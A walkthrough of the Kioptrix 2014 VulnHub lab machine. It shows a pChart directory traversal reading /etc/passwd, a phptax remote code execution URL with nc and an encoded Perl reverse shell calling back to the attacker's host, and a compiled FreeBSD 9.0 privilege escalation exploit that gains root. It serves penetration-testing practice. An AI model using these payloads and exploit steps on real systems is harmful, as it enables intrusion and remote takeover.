# Kioptrix: 2014 AKA Kioptrix 5
### Solved without using Metasploit

Host discovery

```
sudo nmap -sn -oN host_discovery.txt 192.168.0.0/24
```

```
# Nmap 7.94SVN scan initiated Wed Jun 26 00:52:23 2024 as: nmap -sn -oN host_discovery.txt 192.168.0.0/24
Host is up (0.00013s latency).
MAC Address: F0:A6:54:34:FF:45 (Cloud Network Technology Singapore PTE.)
Nmap scan report for kioptrix2014 (192.168.0.170)
Host is up (0.00011s latency).
MAC Address: 08:00:27:7D:26:2A (Oracle VirtualBox virtual NIC)
Nmap scan report for voidgojo (192.168.0.141)
Host is up.
# Nmap done at Wed Jun 26 00:52:25 2024 -- 256 IP addresses (4 hosts up) scanned in 1.89 seconds
```

Full Scan

- `-A`: Enables OS detection, version detection, script scanning, and traceroute.

```
nmap -A -oN full_scan.txt 192.168.0.170

# Nmap 7.94SVN scan initiated Wed Jun 26 00:57:58 2024 as: nmap -AF -oN full_scan.txt 192.168.0.170
Nmap scan report for kioptrix2014 (192.168.0.170)
Host is up (0.00017s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
MAC Address: 08:00:27:7D:26:2A (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: FreeBSD 7.0-RELEASE - 9.0-RELEASE (93%), Juniper MAG2600 SSL VPN gateway (IVE OS 7.3) (92%), Linksys WAP54G WAP (92%), ISS Proventia GX3002C firewall (Linux 2.4.18) (92%), Linux 2.6.20 (92%), Linux 2.6.18 (91%), Linux 2.6.23 (91%), Linux 2.6.24 (91%), FreeBSD 7.0-RC1 (91%), FreeBSD 7.0-STABLE (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.17 ms kioptrix2014 (192.168.0.170)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 26 00:58:34 2024 -- 1 IP address (1 host up) scanned in 36.91 seconds

```

The site was working Fine

<img src="../img/Pasted image 20240626114304.png" alt="Example Image" width="1080"/>

Let explore it's source code for more info

<img src="../img/Pasted image 20240626114319.png" alt="Example Image" width="1080"/>

we got a path `/pChart2.1.3/index.php` , include these in host ip

<img src="../img/Pasted image 20240626114357.png" alt="Example Image" width="1080"/>

we got a control management page

<img src="../img/Pasted image 20240626114410.png" alt="Example Image" width="1080"/>

search for exploit for pchart 2.1.3

```
searchsploit pchart
----------------------------------------------------------------------------------
Exploit Title                                                                      Path
----------------------------------------------------------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                            php/webapps/31173.txt
----------------------------------------------------------------------------------
Shellcodes: No Results
```

we got text file that explains vulnerabilities about PChart 2.1.3 , and download 31173.txt file.

```
 searchsploit -m php/webapps/31173.txt
  Exploit: pChart 2.1.3 - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/31173
     Path: /usr/share/exploitdb/exploits/php/webapps/31173.txt
    Codes: OSVDB-102596, OSVDB-102595
 Verified: True
File Type: HTML document, ASCII text
Copied to: /home/voidgojo/CTF/VulnHub/Kioptrix/5/31173.txt


ls
31173.txt  full_scan.txt  host_discovery.txt
```

as we know that , the site vulnerable to directory traversal. , let try

```
1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.

```

add this `examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd` to `ip_address/pChart2.1.3`/ path

<img src="../img/Pasted image 20240626115746.png" alt="Example Image" width="1080"/>

yes , it vulnerable to directory traversal , by using this let explore the site's config file

<img src="../img/Pasted image 20240626120137.png" alt="Example Image" width="1080"/>

add this path to parameter of URL

<img src="../img/Pasted image 20240626120159.png" alt="Example Image" width="1080"/>

later modified URL because , service Apache version running on machine was 2.2 `apache22`

```
# modified url apache 22 refers 2.2
http://192.168.0.170/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
```

Gather Information about site , site has restriction for all browser agent expect Mozilla 4.0

<img src="../img/Pasted image 20240626120505.png" alt="Example Image" width="1080"/>

Open burp suite

<img src="../img/Pasted image 20240626120815.png" alt="Example Image" width="1080"/>

replace rules change User-Agent to Mozilla 4.0

<img src="../img/Pasted image 20240626120919.png" alt="Example Image" width="1080"/>

Forward the request on port 8008

<img src="../img/Pasted image 20240626121000.png" alt="Example Image" width="1080"/>

make pdf page rendered with tag of `phptax`

<img src="../img/Pasted image 20240626121541.png" alt="Example Image" width="1080"/>

found exploit for phptax 0.8 <= Remote Code Execution Vulnerability
https://www.exploit-db.com/exploits/21665 `PHPTAX`

this is a exploitable URL

```txt
http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
```

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet chosen Perl cmd

let change ip and port for reverse shell

```txt
perl -e 'use Socket;$i="192.168.0.141";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

https://meyerweb.com/eric/tools/dencoder/

```
http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make

# exploitable url RCE , OUR_CODE is parameter where we want to paste rev_shell
http://192.168.0.170:8080/phptax/drawimage.php?pfilez=xxx;OUR_CODE;&pdf=make

#reverse shell
perl -e 'use Socket;$i="192.168.0.141";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# URL encoded , add this in our code
perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.0.141%22%3B%24p%3D6969%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
```

<img src="../img/Pasted image 20240626125632.png" alt="Example Image" width="1080"/>

paste the URL encoded string into Payload

```
http://192.168.0.170:8080/phptax/drawimage.php?pfilez=xxx;perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.0.141%22%3B%24p%3D6969%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27;pdf=make
```

<img src="../img/Pasted image 20240626125606.png" alt="Example Image" width="1080"/>

<img src="../img/Pasted image 20240626125641.png" alt="Example Image" width="1080"/>

```
whoami
www
uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

we know its running FreeBSD 9.0 OS , let search exploit

```
searchsploit freebsd 9.0
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
FreeBSD 9.0 - Intel SYSRET Kernel Privileg | freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Pr | freebsd/local/26368.c

 searchsploit -m freebsd/local/26368.c

  Exploit: FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/26368
     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
    Codes: CVE-2013-2171, OSVDB-94414
 Verified: True
File Type: C source, ASCII text
Copied to: /home/voidgojo/CTF/VulnHub/Kioptrix/5/26368.c
```

we downloaded that 26368.c , post that file into to nc using this symbol `<` , on port 5678

```
ls
26368.c  31173.txt  full_scan.txt  host_discovery.txt
nc -lvnp 5678 < 26368.c
listening on [any] 5678 ...
```

Insider target machine get this file on specified port using nc

```
cd /tmp
nc 192.168.0.141 5678 > 26368.c
gcc 26368.c -o exploit
26368.c:89:2: warning: no newline at end of file
chmod +x exploit
./exploit
```

after running that binary we have been successfully pwned the machine

<img src="../img/Pasted image 20240626130641.png" alt="Example Image" width="1080"/>

```
cd /root
cat congrats.txt
```

```
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
Default settings, nothing fancy but it should've logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should've detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...


loneferret
http://www.kioptrix.com


p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
default it would've blocked your IP (both in hosts.allow & Firewall) for
600 seconds. I was nice enough to remove that part :)
```
